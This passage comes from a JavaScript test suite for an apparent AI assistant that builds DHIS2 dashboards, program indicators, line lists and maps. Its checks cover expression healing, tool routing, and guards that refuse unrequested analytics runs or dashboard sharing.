    const h = ctx.healArgumentEntities({ program_short_name: 'NCD HTN &amp; DM Care', name: 'Visits (A &amp; B)', rules: [{ condition: '#{a} &lt; 140 &amp;&amp; #{b} &gt;= 90' }], files: { 'plugin.jsx': '<span>BP &lt; 140</span>' }, html: '<p>Q&amp;A</p>', path: 'a?x=1&amp;y=2' });
    eq('HTML entities a model put in names / expressions are decoded; code, HTML and paths are left alone', [h.value.program_short_name, h.value.name, h.value.rules[0].condition, h.value.files['plugin.jsx'], h.value.html, h.value.path], ['NCD HTN & DM Care', 'Visits (A & B)', '#{a} < 140 && #{b} >= 90', '<span>BP &lt; 140</span>', '<p>Q&amp;A</p>', 'a?x=1&amp;y=2']);
  }
  {
    const saved8 = ctx.safeDhis2Fetch; const seen = [];
    const d8 = ctx.__dhis2(); const savedOu = d8.ouContext; const savedPc = d8.pageContext;
    d8.ouContext = null; d8.pageContext = { appType: 'Dashboard' };
    ctx.safeDhis2Fetch = async (p) => { seen.push(p); return { headers: [{ name: 'ou' }, { name: 'value' }], rows: [['rootA', '30'], ['rootB', '10']] }; };
    try {
      const r = await ctx.executeTool('count_records', { record_type: 'enrollments', program_override: 'progNcd0001' });
      eq('count_records with no org unit anywhere counts across USER_ORGUNIT (sum of the top units) instead of failing', [r._error || r.count, /dimension=ou:USER_ORGUNIT&/.test(seen[0] || '')], [40, true]);
    } finally { ctx.safeDhis2Fetch = saved8; d8.ouContext = savedOu; d8.pageContext = savedPc; }
  }
  {
    const saved9 = ctx.safeDhis2Fetch; const d9 = ctx.__dhis2(); const savedWa = d9.writeAuth; const posts = [];
    d9.writeAuth = { scope: 'broad', reason: 'verify' };
    ctx.safeDhis2Fetch = async (p, o = {}) => {
      if (o.method === 'POST') { posts.push(p); return { response: { id: 'job1' } }; }
      if (p === 'system/info') return { lastAnalyticsTableSuccess: '2026-10-28T21:00:08.103' };
      if (p.startsWith('programs?order=created:desc')) return { programs: [{ id: 'progNcd0001', displayName: 'NCD', created: '2026-10-28T20:50:00.000' }] };
      return { _error: 'unexpected ' + p };
    };
    try {
      vm.runInContext('lastUserText = "add the pie chart to the dashboard"; conversationHistory = [];', ctx);
      const r = await ctx.executeTool('dhis2_query', { method: 'POST', path: 'resourceTables/analytics' });
      truthy('an analytics run the user did not ask for is refused when the tables are newer than every program (nothing started)', r._scope === 'analytics_run_not_requested' && posts.length === 0);
    } finally { ctx.safeDhis2Fetch = saved9; d9.writeAuth = savedWa; vm.runInContext('lastUserText = ""; conversationHistory = [];', ctx); }
  }
  {
    const saved10 = ctx.safeDhis2Fetch;
    ctx.safeDhis2Fetch = async (p) => (p.startsWith('visualizations/vizCtx00001') ? { dataDimensionItems: [{ programIndicator: { id: 'piRate00001' } }], relativePeriods: { last12Months: true }, userOrganisationUnit: true, columns: [{ dimension: 'dx', items: [{ id: 'piRate00001' }] }], rows: [{ dimension: 'pe', items: [{ id: 'LAST_12_MONTHS' }] }], filters: [{ dimension: 'ou', items: [{ id: 'USER_ORGUNIT' }] }] } : { _error: 'x' });
    try {
      const out = await ctx.enrichAnalyticsPathWithVisualizationContext('analytics?dimension=dx:piRate00001&dimension=pe:LAST_12_MONTHS&filter=ou:USER_ORGUNIT', 'vizCtx00001');
      truthy('visualization-context enrichment never re-adds a dimension the query already has as a FILTER (409)', !/dimension=ou/.test(decodeURIComponent(out)));
    } finally { ctx.safeDhis2Fetch = saved10; }
  }
  {
    const saved11 = ctx.safeDhis2Fetch; let called = 0;
    ctx.safeDhis2Fetch = async () => { called++; return {}; };
    try {
      const r = await ctx.executeTool('dhis2_query', { path: 'dhis-web-capture/index.html' });
      truthy('dhis2_query refuses a web-app page (no 404 call) and explains the Capture deep link', /web-app page/.test(r._error || '') && /enrollment\?enrollmentId=/.test(r._hint || '') && called === 0);
    } finally { ctx.safeDhis2Fetch = saved11; }
    {
      const dS = ctx.__dhis2(); const savedS = { wa: dS.writeAuth, n: dS.consecutiveDiscoveryCalls };
      dS.writeAuth = { scope: 'broad' }; dS.consecutiveDiscoveryCalls = 20;
      truthy('the discovery-streak guard never blocks manage_custom_app preview (its own hint sends the model there), but still blocks a list', ctx.discoveryStreakStopOrNull('manage_custom_app', { action: 'preview' }) === null && !!ctx.discoveryStreakStopOrNull('manage_custom_app', { action: 'list' }));
      dS.writeAuth = savedS.wa; dS.consecutiveDiscoveryCalls = savedS.n;
    }
  }
  const kb = vm.runInContext('KB_PROGRAM_RULE_SYNTAX + KB_METADATA_SHARING', ctx);
  truthy('manuals: one unscoped rule covers every stage; TrackedEntityType is data-shareable', /One rule covers every stage/.test(kb) && /Only Program, ProgramStage and TrackedEntityType are DATA-shareable/.test(kb));
}


// The 2026-10-29 MNCH dashboard thread: a "continue" turn without the
// dashboard/map tools, program indicators that save but break analytics,
// a line list asked to do a pivot table's job, raw chart/map POSTs.
async function runDashboardThreadChecks() {
  console.log('\nMNCH dashboard thread (routing, indicator runtime traps, line-list limits, raw analytics writes):');
  const truthy = (label, got) => (got ? ok(label) : bad(`${label} => ${JSON.stringify(got)}`));
  const d = ctx.__dhis2();
  const savedApi = d.apiVersion;

  // Routing: "continue" carries the request it continues.
  const ask = 'Please create a dashboard for this program, it should have different maps, visualizations and tables, first create a line listing table that has all the OUs, then a visualization, lastly create a map with a point on each OU sized by the percentage.';
  vm.runInContext(`conversationHistory = ${JSON.stringify([{ role: 'user', content: ask }, { role: 'assistant', content: 'Say continue and I will finish.' }])};`, ctx);
  const routing = ctx.buildRoutingText('continue');
  const names = ctx.getContextualTools({}, routing, false, 'continue').map((t) => t.function.name);
  truthy('a "continue" turn is routed with the request it continues (dashboards, maps, line lists offered)', routing.includes('line listing table') && ['manage_dashboards', 'manage_maps', 'manage_line_lists'].every((n) => names.includes(n)));
  truthy('…a long new request is routed on itself only', ctx.buildRoutingText('x '.repeat(40)).trim() === 'x '.repeat(40).trim());
  vm.runInContext(`conversationHistory = ${JSON.stringify([{ role: 'user', content: ask }, { role: 'user', content: 'continue' }])};`, ctx);
  truthy('…bare follow-ups are skipped when looking for the request', ctx.buildRoutingText('yes go ahead').includes('line listing table'));
  vm.runInContext('conversationHistory = [];', ctx);

  // Program-indicator analytics-runtime traps (verified live 2.42.5 + 2.43.2).
  const stageById = new Map([
    ['eaDHS084uMp', { displayName: 'ANC 1st visit', programStageDataElements: [{ dataElement: { id: 'UXz7xuGCEhU', displayName: 'Weight', valueType: 'NUMBER' } }] }],
    ['grIfo3oOf4Y', { displayName: 'ANC Visit (2-4+)', programStageDataElements: [{ dataElement: { id: 'g9eOBujte1U', displayName: 'ANC Visit', valueType: 'TEXT' } }] }],
  ]);
  const trap = (pi, v = 43) => ctx.piAnalyticsRuntimeTraps({ name: 'x', filter: '', ...pi }, stageById, v);
  const healed = { expression: 'V{tei_count}', analyticsType: 'ENROLLMENT', aggregationType: 'SUM' };
  const r1 = ctx.piAnalyticsRuntimeTraps(healed, stageById, 43);
  truthy('V{tei_count} + SUM (SQL 42883) is healed to COUNT and reported', !r1.error && healed.aggregationType === 'COUNT' && r1.corrections.length === 1);
  truthy('…aggregation NONE (HTTP 500 / SQL 42601 in every analytics query) is refused, except a bare count variable which heals to COUNT', !!trap({ expression: 'd2:count(#{eaDHS084uMp.UXz7xuGCEhU})', analyticsType: 'ENROLLMENT', aggregationType: 'NONE' }).error && (() => { const pi = { name: 'x', filter: '', expression: 'V{enrollment_count}', analyticsType: 'ENROLLMENT', aggregationType: 'NONE' }; const r = ctx.piAnalyticsRuntimeTraps(pi, stageById, 43); return !r.error && pi.aggregationType === 'COUNT'; })());
  {
    // Immunization dashboard (Haiku, 2026-11-25): COUNT of d2:condition("weight < 2500", 1, 0) counted
    // every weighed baby (live COUNT 19,021, SUM 4).
    const lbw = { name: 'LBW', filter: '#{eaDHS084uMp.UXz7xuGCEhU} > 0', expression: 'd2:condition("#{eaDHS084uMp.UXz7xuGCEhU} > 0 && #{eaDHS084uMp.UXz7xuGCEhU} < 2500", 1, 0)', analyticsType: 'ENROLLMENT', aggregationType: 'COUNT' };
    const pct = { name: 'LBW %', filter: '', expression: "d2:condition('#{eaDHS084uMp.UXz7xuGCEhU} < 2500', 100, 0)", analyticsType: 'EVENT', aggregationType: 'COUNT' };
    const plain = { name: 'weighed', filter: '', expression: '#{eaDHS084uMp.UXz7xuGCEhU}', analyticsType: 'ENROLLMENT', aggregationType: 'COUNT' };
    const a = ctx.piAnalyticsRuntimeTraps(lbw, stageById, 43); const b = ctx.piAnalyticsRuntimeTraps(pct, stageById, 43); const c = ctx.piAnalyticsRuntimeTraps(plain, stageById, 43);
    truthy('COUNT of d2:condition(…, 1, 0) (the condition is ignored) heals to SUM, of d2:condition(…, 100, 0) to AVERAGE; a plain value under COUNT is left alone',
      !a.error && lbw.aggregationType === 'SUM' && a.corrections.some(x => x.to === 'SUM' && /ignores the expression/.test(x.reason))
      && !b.error && pct.aggregationType === 'AVERAGE' && plain.aggregationType === 'COUNT' && !(c.corrections || []).some(x => x.field === 'aggregation_type'));
  }
  truthy('…V{enrollment_count} inside arithmetic with SUM is refused', !!trap({ expression: 'V{enrollment_count} * 100', analyticsType: 'ENROLLMENT', aggregationType: 'SUM' }).error);
  truthy('…V{event_count} in an ENROLLMENT indicator (42703) is refused', /42703/.test(trap({ expression: 'V{event_count}', analyticsType: 'ENROLLMENT', aggregationType: 'COUNT' }).error || ''));
  truthy('…d2:countIfValue on a TEXT data element is refused on 2.43, allowed on 2.42', !!trap({ expression: "d2:countIfValue(#{grIfo3oOf4Y.g9eOBujte1U}, '2')", analyticsType: 'ENROLLMENT', aggregationType: 'SUM' }).error && !trap({ expression: "d2:countIfValue(#{grIfo3oOf4Y.g9eOBujte1U}, '2')", analyticsType: 'ENROLLMENT', aggregationType: 'SUM' }, 42).error);
  truthy('…d2:countIfCondition on a TEXT data element is refused on every version', !!trap({ expression: "d2:countIfCondition(#{grIfo3oOf4Y.g9eOBujte1U}, \"== '2'\")", analyticsType: 'ENROLLMENT', aggregationType: 'SUM' }, 42).error);
  truthy('…numeric countIfValue and V{event_count} SUM in an EVENT indicator pass', !trap({ expression: 'd2:countIfValue(#{eaDHS084uMp.UXz7xuGCEhU}, 3000)', analyticsType: 'ENROLLMENT', aggregationType: 'SUM' }).error && !trap({ expression: 'V{event_count}', analyticsType: 'EVENT', aggregationType: 'SUM', filter: "V{program_stage_id} == 'eaDHS084uMp'" }).error);
  truthy('…an EVENT count named after one stage but counting every stage is refused with the stage filter', /V\{program_stage_id\} == 'grIfo3oOf4Y'/.test(trap({ name: 'ANC 2-4+ visit count', expression: 'V{event_count}', analyticsType: 'EVENT', aggregationType: 'COUNT' }).hint || ''));
  truthy('…an unscoped EVENT count with a generic name only gets an advisory', (() => { const r = trap({ name: 'All visits', expression: 'V{event_count}', analyticsType: 'EVENT', aggregationType: 'COUNT' }); return !r.error && r.advisories.length === 1; })());

  {
    const saved = ctx.safeDhis2Fetch;
    ctx.safeDhis2Fetch = async (p) => (p.startsWith('programs/') ? { programStages: [...stageById.entries()].map(([id, st]) => ({ id, ...st })) } : { _error: 'x' });
    try {
      const pis = [
        { id: 'w3OTpzL30uY', name: 'ANC 1st visit count', expression: 'V{event_count}', filter: '', analyticsType: 'EVENT', aggregationType: 'COUNT' },
        { id: 'fgjdNH53Rh6', name: 'ANC 1st visit coverage (%)', expression: 'd2:condition("d2:hasValue(#{eaDHS084uMp.UXz7xuGCEhU})", 100, 0)', filter: '', analyticsType: 'ENROLLMENT', aggregationType: 'AVERAGE' },
      ];
      const n = await ctx.annotateProgramIndicatorProblems(pis, 'uy2gU8kT1jF');
      truthy('list/get flag an EXISTING indicator that counts every stage (so it is not reused blindly); a sound one is untouched', n === 1 && /ALL 2 stages/.test(pis[0]._problem || '') && !pis[1]._problem);
    } finally { ctx.safeDhis2Fetch = saved; }
  }

  // d2:hasValue inside d2:condition is valid (server-verified); bare is not.
  truthy('PI lint: d2:hasValue inside d2:condition passes, a bare top-level d2:hasValue is still refused',
    ctx.lintProgramIndicatorExpression('d2:condition("d2:hasValue(#{eaDHS084uMp.UXz7xuGCEhU})", 100, 0)', 'expression') === null
    && !!ctx.lintProgramIndicatorExpression('d2:hasValue(#{eaDHS084uMp.UXz7xuGCEhU})', 'expression'));

  // Runtime proof after save: the broken one of two is isolated.
  {
    const saved = ctx.safeDhis2Fetch; const calls = [];
    ctx.safeDhis2Fetch = async (p) => {
      calls.push(p);
      if (p === 'system/info') return { lastAnalyticsTableSuccess: '2026-10-29T01:00:00.000' };
      if (p.startsWith('programs/progRt00001')) return { id: 'progRt00001', created: '2020-01-01T00:00:00.000' };
      if (p.startsWith('analytics?')) {
        const dx = decodeURIComponent(p).match(/dx:([^&]+)/)[1].split(';');
        if (dx.includes('piBroken001')) return { _error: 'DHIS2 API 409: Query failed because of a syntax error (SqlState: 42883)', _status: 409 };
        return { rows: dx.map((id) => [id, '1.0']) };
      }
      return { _error: 'unexpected ' + p };
    };
    try {
      const rc = await ctx.piRuntimeAnalyticsCheck('progRt00001', ['piGood00001', 'piBroken001']);
      truthy('post-save analytics check isolates the indicator that cannot be computed', rc && rc.ok === false && rc.broken.length === 1 && rc.broken[0].id === 'piBroken001' && rc.with_data.includes('piGood00001'));
    } finally { ctx.safeDhis2Fetch = saved; }
  }
  {
    const saved = ctx.safeDhis2Fetch;
    ctx.safeDhis2Fetch = async (p) => {
      if (p === 'system/info') return { lastAnalyticsTableSuccess: '2026-10-29T01:00:00.000' };
      if (p.startsWith('programs/progRt00002')) return { id: 'progRt00002', created: '2020-01-01T00:00:00.000' };
      return { _error: 'DHIS2 API 409: Query failed because a referenced table does not exist (E7144)', _status: 409 };
    };
    try {
      const rc = await ctx.piRuntimeAnalyticsCheck('progRt00002', ['piGood00001']);
      truthy('…a missing analytics table is not blamed on the indicator', rc && rc.ok === true && rc.skipped && rc.skipped.length === 1);
    } finally { ctx.safeDhis2Fetch = saved; }
  }

  // Line lists: what a column can show per row.
  const llCtx = {
    stages: [{ id: 'grIfo3oOf4Y', name: 'ANC Visit (2-4+)', deIds: ['g9eOBujte1U'] }],
    des: new Map([['g9eOBujte1U', { id: 'g9eOBujte1U', name: 'ANC Visit', valueType: 'TEXT' }]]),
  };
  const rowProblem = (pi) => ctx.lineListPiRowLevelProblem({ id: 'piX0000000a', name: 'p', filter: '', analyticsType: 'ENROLLMENT', ...pi }, llCtx, 'ENROLLMENT');
  const pct = rowProblem({ expression: 'd2:condition("d2:hasValue(#{grIfo3oOf4Y.g9eOBujte1U})", 100, 0)', aggregationType: 'AVERAGE' });
  truthy('line list: a percentage indicator column is refused with the pivot-table alternative', pct && /PERCENTAGE/.test(pct._error) && /PIVOT_TABLE/.test(pct._hint) && pct.overridable === true);
  truthy('…a count-of-records column (1 on every row) is refused, not overridable', (() => { const r = rowProblem({ expression: 'V{enrollment_count}', aggregationType: 'COUNT' }); return r && /1 on every row/.test(r._error) && !r.overridable; })());
  d.apiVersion = '43';
  truthy('…an analytics-runtime trap is refused with its real cause before any probe (2.43)', /countIfValue/.test((rowProblem({ expression: "d2:countIfValue(#{grIfo3oOf4Y.g9eOBujte1U}, '2')", aggregationType: 'SUM' }) || {})._error || ''));
  truthy('…a per-record count (d2:count, SUM) is fine', rowProblem({ expression: 'd2:count(#{grIfo3oOf4Y.g9eOBujte1U})', aggregationType: 'SUM' }) === null);
  {
    const ouCtx = { program: { name: 'P' }, stagesById: new Map(), teas: new Map(), des: new Map(), pis: new Map(), teaByName: new Map(), deByName: new Map(), piByName: new Map() };
    const saved = ctx.safeDhis2Fetch;
    ctx.safeDhis2Fetch = async (p) => (p.startsWith('organisationUnits?') ? { organisationUnits: [{ id: 'ImspTQPwCqd' }] } : { _error: 'x' });
    try {
      const joined = await ctx.lineListResolveDimension({ dimension: 'ou', org_units: ['LEVEL-4;ImspTQPwCqd'] }, ouCtx, 'ENROLLMENT', new Map(), 'column');
      const lvl = await ctx.lineListResolveDimension({ dimension: 'ou', org_unit_level: 4 }, ouCtx, 'ENROLLMENT', new Map(), 'column');
      truthy('…org units sent as "LEVEL-4;<uid>" or as org_unit_level are healed, not refused', joined.kind === 'ou' && joined.items.join(',') === 'LEVEL-4,ImspTQPwCqd' && lvl.kind === 'ou' && lvl.items[0] === 'LEVEL-4');
    } finally { ctx.safeDhis2Fetch = saved; }
  }

  // dhis2_query: hand-built charts / maps / line lists / dashboards are refused.
  {
    const saved = ctx.safeDhis2Fetch; const savedWa = d.writeAuth; let sent = 0;
    d.writeAuth = { scope: 'broad', reason: 'verify' };
    ctx.safeDhis2Fetch = async () => { sent++; return { status: 'OK' }; };
    try {
      const viz = await ctx.executeTool('dhis2_query', { method: 'POST', path: 'visualizations', body: { name: 'x', type: 'LINE', columns: [{ dimension: 'ou', items: [{ id: 'ImspTQPwCqd' }] }] } });
      const map = await ctx.executeTool('dhis2_query', { method: 'POST', path: 'maps', body: { name: 'x', mapViews: [] } });
      const mv = await ctx.executeTool('dhis2_query', { method: 'PATCH', path: 'mapViews/JHamZu0r4rx', body: { thematicMapType: 'BUBBLE' } });
      const dash = await ctx.executeTool('dhis2_query', { method: 'POST', path: 'dashboards', body: { name: 'x', dashboardItems: [] } });
      const meta = await ctx.executeTool('dhis2_query', { method: 'POST', path: 'metadata', body: { maps: [{ name: 'x' }] } });
      truthy('dhis2_query refuses hand-built visualizations / maps / map layers / dashboards / metadata bundles and names the tool (nothing sent)',
        sent === 0 && viz._redirect === 'manage_dashboards' && map._redirect === 'manage_maps' && mv._redirect === 'manage_maps' && dash._redirect === 'manage_dashboards' && meta._redirect === 'manage_maps');
      sent = 0;
      const rename = await ctx.executeTool('dhis2_query', { method: 'PATCH', path: 'visualizations/p3QxBYDESIE', body: { name: 'Renamed' } });
      truthy('…a rename-only PATCH still goes through', !rename._redirect && sent > 0);
    } finally { ctx.safeDhis2Fetch = saved; d.writeAuth = savedWa; }
  }

  // LAST_N_YEARS excludes the current year: a chart that misses all its data says so.
  {
    const saved = ctx.safeDhis2Fetch; let calls = 0;
    ctx.safeDhis2Fetch = async (p) => { calls++; return /pe:THIS_YEAR/.test(decodeURIComponent(p)) ? { rows: [['piA0000000a', '100.0']] } : { rows: [['piA0000000a', '0.0']] }; };
    try {
      const w = await ctx.periodsMissThisYearWarning(['piA0000000a'], ['LAST_5_YEARS']);
      const callsAfterFirst = calls;
      const none = await ctx.periodsMissThisYearWarning(['piA0000000a'], ['LAST_12_MONTHS']);
      const withThis = await ctx.periodsMissThisYearWarning(['piA0000000a'], ['THIS_YEAR', 'LAST_5_YEARS']);
      truthy('a chart on LAST_5_YEARS whose data is all in the current year gets a warning; LAST_12_MONTHS / THIS_YEAR+LAST_5_YEARS cost no call', /COMPLETED/.test(w || '') && /THIS_YEAR/.test(w || '') && none === null && withThis === null && calls === callsAfterFirst);
    } finally { ctx.safeDhis2Fetch = saved; }
  }

  truthy('an event analytics query mixing two stages is refused before it is sent (409 E7244); one stage or enrollment analytics passes',
    !!ctx.eventAnalyticsMultiStageRefusal('analytics/events/aggregate/uy2gU8kT1jF?dimension=ou%3AImspTQPwCqd&dimension=eaDHS084uMp.UXz7xuGCEhU&dimension=grIfo3oOf4Y.g9eOBujte1U&stage=eaDHS084uMp')
    && ctx.eventAnalyticsMultiStageRefusal('analytics/events/aggregate/uy2gU8kT1jF?dimension=ou%3AImspTQPwCqd&dimension=eaDHS084uMp.UXz7xuGCEhU&stage=eaDHS084uMp') === null
    && ctx.eventAnalyticsMultiStageRefusal('analytics/enrollments/aggregate/uy2gU8kT1jF?dimension=eaDHS084uMp.UXz7xuGCEhU&dimension=grIfo3oOf4Y.g9eOBujte1U') === null
    && !!ctx.eventAnalyticsMultiStageRefusal('analytics/events/aggregate/WSGAb5XwJ3Y?dimension=ou%3AImspTQPwCqd&dimension=stage%3AWZbXY0S00lP%3BedqlbukwRfQ%3BPFDfvmGpsR3'));
  {
    const saved = ctx.safeDhis2Fetch; const savedWa = d.writeAuth; let sent = 0;
    d.writeAuth = { scope: 'broad', reason: 'verify' };
    ctx.safeDhis2Fetch = async () => { sent++; return { object: { publicAccess: 'rw------', userGroupAccesses: [], userAccesses: [] } }; };
    try {
      vm.runInContext(`conversationHistory = []; lastUserText = ${JSON.stringify(ask)};`, ctx);
      const r = await ctx.executeTool('manage_metadata', { action: 'update_sharing', object_type: 'dashboards', object_id: 'w1e0muHG8Gk', public_access: 'rwr-----' });
      truthy('sharing a dashboard the user never asked to share is refused (nothing sent)', r._scope === 'sharing_not_requested' && sent === 0);
      vm.runInContext('lastUserText = "build the dashboard and make it public for everyone";', ctx);
      const r2 = await ctx.executeTool('manage_metadata', { action: 'update_sharing', object_type: 'dashboards', object_id: 'w1e0muHG8Gk', public_access: 'r-------' });
      truthy('…and allowed when the user asked for it', r2._scope !== 'sharing_not_requested' && sent > 0);
      // Dashboard thread 2026-11-10: the assistant offered to share, the user said yes, refused twice.
      sent = 0;
      vm.runInContext(`conversationHistory = [{ role: 'user', content: ${JSON.stringify(ask)} }, { role: 'assistant', content: 'Built. Want me to share the dashboard read-only with everyone?' }]; lastUserText = 'Yes, go ahead.';`, ctx);
      const r3 = await ctx.executeTool('manage_metadata', { action: 'update_sharing', object_type: 'dashboards', object_id: 'w1e0muHG8Gk', public_access: 'r-------' });
      truthy('a yes to the assistant\'s own sharing question allows view-only sharing', r3._scope !== 'sharing_not_requested' && sent > 0);
      sent = 0;
      const r4 = await ctx.executeTool('manage_metadata', { action: 'update_sharing', object_type: 'dashboards', object_id: 'w1e0muHG8Gk', public_access: 'rw------' });
      const r5 = await ctx.executeTool('manage_metadata', { action: 'update_sharing', object_type: 'dashboards', object_id: 'w1e0muHG8Gk', user_group_accesses: [{ id: 'wl5cDMuUhmF' }] });
      truthy('…but never edit access (public rw, or a group with no access string = rw)', r4._scope === 'sharing_not_requested' && r5._scope === 'sharing_not_requested' && sent === 0 && /view access only/.test(r4._error));
      vm.runInContext(`conversationHistory = [{ role: 'user', content: ${JSON.stringify(ask)} }, { role: 'assistant', content: 'Built. The dashboard has 9 tiles. Sharing was left as created.' }]; lastUserText = 'Yes, go ahead.';`, ctx);
      const r6 = await ctx.executeTool('manage_metadata', { action: 'update_sharing', object_type: 'dashboards', object_id: 'w1e0muHG8Gk', public_access: 'r-------' });
      vm.runInContext(`conversationHistory = [{ role: 'user', content: ${JSON.stringify(ask)} }, { role: 'assistant', content: 'Built. Want me to share the dashboard read-only with everyone?' }]; lastUserText = 'Now add a chart of imaging studies per month please';`, ctx);
      const r7 = await ctx.executeTool('manage_metadata', { action: 'update_sharing', object_type: 'dashboards', object_id: 'w1e0muHG8Gk', public_access: 'r-------' });
      truthy('…not a yes to a message that offered no sharing, and not another request after the offer', r6._scope === 'sharing_not_requested' && r7._scope === 'sharing_not_requested' && sent === 0);
      {
        // One call for a whole program (threads of 2026-11-10 made one stage_details call per stage).
        const prog = (n) => ({ id: 'CcHoHIzjuVo', displayName: 'Breast Health', programType: 'WITH_REGISTRATION', trackedEntityType: { id: 'nEenWmSyUEp', displayName: 'Person' },
          programTrackedEntityAttributes: [{ trackedEntityAttribute: { id: 'w75KJ2mc4zz', displayName: 'Full name', valueType: 'TEXT' } }],
          programStages: [
            { id: 'trE2SPFXJIt', displayName: 'Imaging', repeatable: true, sortOrder: 2, programStageDataElements: Array.from({ length: n }, (_, i) => ({ compulsory: i === 0, dataElement: { id: 'orFDELOK5v' + (i % 10), displayName: 'BI-RADS ' + i, valueType: 'TEXT', optionSet: { id: 'OptSet00001', options: [{ code: 'BIRADS_1', displayName: '1 - Negative' }, { code: 'BIRADS_5', displayName: '5 - Highly suggestive' }] } } })) },
            { id: 'M6WPRaMqZsB', displayName: 'Exam', repeatable: false, sortOrder: 1, programStageDataElements: [{ dataElement: { id: 'Nme1rbqWUS7', displayName: 'Mass size', valueType: 'NUMBER' } }] },
          ] });
        const strip = (o) => JSON.parse(JSON.stringify(o).replace(/,"options":\[[^\]]*\]/g, ''));
        let size = 3;
        ctx.safeDhis2Fetch = async (path) => { sent++; return /options%5B|options\[/.test(path) ? prog(size) : strip(prog(size)); };
        const st = await ctx.executeTool('get_program_info', { info_type: 'structure', program_id: 'CcHoHIzjuVo' });
        truthy('get_program_info structure returns every stage in form order with ids, value types and option codes in one answer',
          st.stages && st.stages.map((x) => x.id).join() === 'M6WPRaMqZsB,trE2SPFXJIt' && st.stages[1].repeatable === true
          && st.stages[1].data_elements[0].options.BIRADS_5 === '5 - Highly suggestive' && st.stages[1].data_elements[0].compulsory === true
          && st.attributes[0].id === 'w75KJ2mc4zz' && st.totals.data_elements === 4 && /no stage_details call is needed/.test(st._note));
        size = 700;
        const big = await ctx.executeTool('get_program_info', { info_type: 'structure', program_id: 'CcHoHIzjuVo' });
        size = 3000;
        const huge = await ctx.executeTool('get_program_info', { info_type: 'structure', program_id: 'CcHoHIzjuVo' });
        truthy('…a large program drops the option lists (option set ids stay), a huge one answers the stage list with counts',
          big.stages[1].data_elements[0].option_set === 'OptSet00001' && !big.stages[1].data_elements[0].options && /left out/.test(big._note)
          && huge.stages[1].data_element_count === 3000 && !huge.stages[1].data_elements && /stage_details/.test(huge._note));
        ctx.safeDhis2Fetch = async () => { sent++; return { object: { publicAccess: 'rw------', userGroupAccesses: [], userAccesses: [] } }; };
        sent = 0;
      }
      sent = 0;
      const rp = await ctx.executeTool('dhis2_query', { path: 'periods', query_params: { periodType: 'Monthly', startDate: '2025-01-01', endDate: '2026-12-31' } });
      const rrp = await ctx.executeTool('dhis2_query', { path: 'relativePeriods', query_params: { fields: 'id,name', paging: 'false' } });
      const rpa = await ctx.executeTool('dhis2_query', { path: 'programAttributes', query_params: { filter: 'program.id:eq:IpHINAT79UW', fields: 'id' } });
      const rap = await ctx.executeTool('dhis2_query', { path: 'analytics/periods', query_params: { fields: 'id' } });
      const rpse = await ctx.executeTool('dhis2_query', { path: 'programStageElements' });
      const rnt = await ctx.executeTool('dhis2_query', { path: 'notificationTemplates' });
      const rsd = await ctx.executeTool('dhis2_query', { path: 'programStageDataElements', query_params: { filter: 'programStage.id:eq:A03MvHHogjR' } });
      const rc = await ctx.executeTool('dhis2_query', { path: 'completeDataSetRegistrations', query_params: { dataSet: 'BfMAe6Itzgt', period: '202510', children: 'true' } });
      const rr = await ctx.executeTool('dhis2_query', { path: 'analytics', query_params: { dimension: ['dx:REPORTING_RATE', 'ou:ImspTQPwCqd'], filter: 'pe:202510' } });
      const ra = await ctx.executeTool('dhis2_query', { path: 'apps/ai-breast-imaging-scorecard/app-guard.js' });
      truthy('dhis2_query answers the guessed "periods" endpoint, an incomplete completeDataSetRegistrations, a bare REPORTING_RATE and an app file read locally (nothing sent)',
        rp._scope === 'known_endpoint_guidance' && /202510/.test(rp._hint) && rrp._scope === 'known_endpoint_guidance' && [rap, rpse, rnt].every(x => x._scope === 'known_endpoint_guidance') && rpa._scope === 'known_endpoint_guidance' && /programs\/IpHINAT79UW\?fields=programTrackedEntityAttributes/.test(rpa._hint) && /programStages\/A03MvHHogjR\?fields=programStageDataElements/.test(rsd._hint) && rc._scope === 'complete_registrations_incomplete' && rr._scope === 'reporting_rate_needs_data_set'
        && ra._scope === 'known_endpoint_guidance' && /get_source/.test(ra._hint) && sent === 0);
    } finally { ctx.safeDhis2Fetch = saved; d.writeAuth = savedWa; vm.runInContext('lastUserText = ""; conversationHistory = [];', ctx); }
  }

  // RMNCH dashboard run (2026-10-29): Yes/No comparisons, events in the period,
  // swallowed failures in multi-indicator queries, no program PATCH.
  {
    const boolStages = new Map([['PFDfvmGpsR3', { displayName: 'Care at birth', programStageDataElements: [
      { dataElement: { id: 'FIHEeJwfhZH', displayName: 'Maternal near-miss', valueType: 'BOOLEAN' } },
      { dataElement: { id: 'vANAXwtLwcT', displayName: 'Hemoglobin value', valueType: 'NUMBER' } },
    ] }]]);
    const yes = { name: 'Near-miss Yes', expression: 'd2:condition("#{PFDfvmGpsR3.FIHEeJwfhZH} == true", 1, 0)', filter: "V{program_stage_id} == 'PFDfvmGpsR3' && #{PFDfvmGpsR3.FIHEeJwfhZH} != 'false'", analyticsType: 'EVENT', aggregationType: 'SUM' };
    const r = ctx.piAnalyticsRuntimeTraps(yes, boolStages, 43);
    truthy('a Yes/No data element compared with true / \'false\' (SQL 42883 / E7132) is healed to 1 / 0 in expression and filter, and reported',
      !r.error && yes.expression === 'd2:condition("#{PFDfvmGpsR3.FIHEeJwfhZH} == 1", 1, 0)' && /FIHEeJwfhZH\} != 0$/.test(yes.filter) && r.corrections.length === 2);
    const un = { name: 'Not answered', expression: 'V{event_count}', filter: "V{program_stage_id} == 'PFDfvmGpsR3' && #{PFDfvmGpsR3.FIHEeJwfhZH} == ''", analyticsType: 'EVENT', aggregationType: 'COUNT' };
    const ru = ctx.piAnalyticsRuntimeTraps(un, boolStages, 43);
    truthy('"missing" written as == \'\' (E7132 on number / Yes-No, always 0 on text) is healed to !d2:hasValue(…)', !ru.error && /&& !d2:hasValue\(#\{PFDfvmGpsR3\.FIHEeJwfhZH\}\)$/.test(un.filter));
    const num = { name: 'x', expression: 'd2:condition("#{PFDfvmGpsR3.vANAXwtLwcT} == 1", 1, 0)', filter: '', analyticsType: 'EVENT', aggregationType: 'SUM' };
    truthy('…a numeric data element is left alone', ctx.piAnalyticsRuntimeTraps(num, boolStages, 43).corrections.length === 0);
  }
  {
    const saved = { sdf: ctx.safeDhis2Fetch, val: ctx.validateProgramIndicatorExpressionResilient };
    ctx.safeDhis2Fetch = async (p) => (p.startsWith('categoryCombos') ? { categoryCombos: [{ id: 'bjDvmb4bfuf' }] }
